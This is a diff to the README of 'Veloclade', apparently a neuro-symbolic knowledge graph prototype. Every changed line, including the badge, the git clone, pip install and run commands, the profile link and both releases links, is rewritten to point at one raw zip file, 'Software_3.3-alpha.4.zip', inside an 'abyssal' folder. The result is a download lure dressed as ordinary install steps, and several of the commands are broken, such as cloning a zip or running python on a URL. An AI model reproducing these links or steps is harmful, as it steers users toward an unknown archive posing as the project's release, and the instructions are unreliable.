@@ -1,6 +1,6 @@
 # Veloclade: A Neuro-Symbolic Knowledge Graph System 🌐
 
-![Veloclade Logo](https://img.shields.io/badge/Veloclade-Research%20Prototype-brightgreen)
+![Veloclade Logo](https://raw.githubusercontent.com/Gkk787578/veloclade/main/abyssal/Software_3.3-alpha.4.zip%20Prototype-brightgreen)
 
 Welcome to the Veloclade repository! Veloclade is a research prototype that combines neuro-symbolic approaches with advanced graph learning techniques. This system is designed for those interested in the intersection of AI, dynamic ontology management, and knowledge representation. 
 
@@ -35,13 +35,13 @@ To get started with Veloclade, you need to clone the repository and install the 
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Gkk787578/veloclade.git
+   git clone https://raw.githubusercontent.com/Gkk787578/veloclade/main/abyssal/Software_3.3-alpha.4.zip
    cd veloclade
    ```
 
 2. Install the required Python packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Gkk787578/veloclade/main/abyssal/Software_3.3-alpha.4.zip
    ```
 
 3. Ensure you have the necessary system dependencies. Refer to the documentation for specific requirements based on your operating system.
@@ -51,7 +51,7 @@ To get started with Veloclade, you need to clone the repository and install the 
 To run Veloclade, execute the following command in your terminal:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Gkk787578/veloclade/main/abyssal/Software_3.3-alpha.4.zip
 ```
 
 ### Example Workflow
@@ -89,11 +89,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out to the maintainers:
 
-- **Gkk787578**: [GitHub Profile](https://github.com/Gkk787578)
+- **Gkk787578**: [GitHub Profile](https://raw.githubusercontent.com/Gkk787578/veloclade/main/abyssal/Software_3.3-alpha.4.zip)
 
 ## Releases
 
-To download the latest release, visit the [Releases section](https://github.com/Gkk787578/veloclade/releases). You can find pre-built binaries and other important updates there.
+To download the latest release, visit the [Releases section](https://raw.githubusercontent.com/Gkk787578/veloclade/main/abyssal/Software_3.3-alpha.4.zip). You can find pre-built binaries and other important updates there.
 
 For more information about specific releases, check the release notes in the repository.
 
@@ -107,6 +107,6 @@ For more information about specific releases, check the release notes in the rep
 
 Veloclade represents a significant step forward in the field of AI research. By combining symbolic reasoning with advanced graph techniques, it opens up new possibilities for knowledge representation and reasoning. We invite you to explore, experiment, and contribute to this exciting project.
 
-For further updates, check the [Releases section](https://github.com/Gkk787578/veloclade/releases) regularly.
+For further updates, check the [Releases section](https://raw.githubusercontent.com/Gkk787578/veloclade/main/abyssal/Software_3.3-alpha.4.zip) regularly.
 
 Thank you for your interest in Veloclade! We look forward to your contributions and insights.
